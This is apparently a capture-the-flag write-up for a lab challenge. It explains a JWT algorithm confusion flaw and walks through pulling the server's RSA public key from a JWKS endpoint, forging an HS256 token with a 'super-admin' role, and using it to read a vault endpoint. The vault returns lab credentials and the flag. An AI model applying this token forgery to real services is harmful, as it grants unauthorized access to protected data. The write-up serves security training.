# FLAG 5: JWT Algorithm Confusion Attack

[← Back to README](README.md) | [Previous: FLAG 4](FLAG-4-ssrf.md)

<img width="805" height="145" alt="image" src="https://github.com/user-attachments/assets/5399a22a-5271-40fb-beca-07a042a44fe9" />

---

## 🎯 Challenge Summary

| Aspect | Details |
|--------|---------|
| **Vulnerability Type** | Cryptographic Failure - Algorithm Confusion |
| **Points** | 450 pts |
| **Prerequisite** | Get public key from FLAG 4 hint |

---

## 🔍 The Vulnerability Explained

### The Problem: Algorithm Confusion

The server **trusts the algorithm from the JWT header**:

```javascript
// VULNERABLE CODE
const decoded = jwt.verify(token, publicKey);
// Server reads: header says "alg": "HS256"
// Server thinks: "Okay, I'll verify with HS256"
// Server uses: publicKey as the HMAC secret
// Result: Signature matches! Token accepted! ✗
```
---

##  😈 Exploitation

---

### Got the Public Key

From FLAG 4 response, I got:

```
"JWKS_Endpoint": "https://auth.nexacorp.io/.well-known/jwks.json"
```

**In Postman, I created a request:**

```
Method: GET
URL: http://nexacorp.ine.local:1337/.well-known/jwks.json
```

**Response:**

```json
{
  "keys": [{
    "alg": "RS256",
    "x5c": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K..."
  }]
}
```

**Keeping the `x5c` value** (it's base64 encoded public key)

---

### Decoded the Public Key

1. Went to https://www.base64decode.org/
2. Pasted the x5c value
3. Clicked "Decode"
4. Got the PEM public key:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
[duh duh duh]
-----END PUBLIC KEY-----
```
---

### Createed Forged JWT on JWT.io

#### Header
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
#### Payload

```json
{
  "role": "super-admin",
  "sub": "1003",
  "iss": "https://auth.nexacorp.io",
  "aud": "nexacorp-vault",
  "iat": 1778104434,
  "exp": 1778133234
}
```

**Key fields:**
- `role`: `"super-admin"` ← I want admin access
- `aud`: `"nexacorp-vault"` ← For vault endpoint



### Use Token to Access Vault

**In Postman, created a new request:**

```
Method: GET
URL: http://nexacorp.ine.local:1337/api/vault/critical-secrets
```

**Headers:**

```
KEY              VALUE
─────────────────────────────────────────────
Authorization    Bearer [ forged JWT]
```

---

### Response!

```json
{
  "vault_access": "GRANTED",
  "algorithm_used": "HS256 (algorithm confusion attack successful)",
  "critical_secrets": {
    "database_master": "postgresql://vault_admin:Nxa$up3r$ecr3t2024@db.nexacorp.local:5432/prod",
    "aws_root_key": "AKIAIOSFODNN7NEXACORP",
    "aws_root_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYNEXACORP2024",
    "internal_api_signing_key": "nxa_int_signing_k3y_2024",
    "flag": "FLAG{jwt_4lg0_c0nfus10n_rs2hs}"
  },
  "_vulnerability": "JWT Algorithm Confusion (CVE-2016-10555 pattern) — server trusted alg header, used RSA public key as HS256 HMAC secret"
}
```
FLAG CAPTURED!!!
---

[← Back to README](README.md) | [Previous: FLAG 4](FLAG-4-ssrf.md)
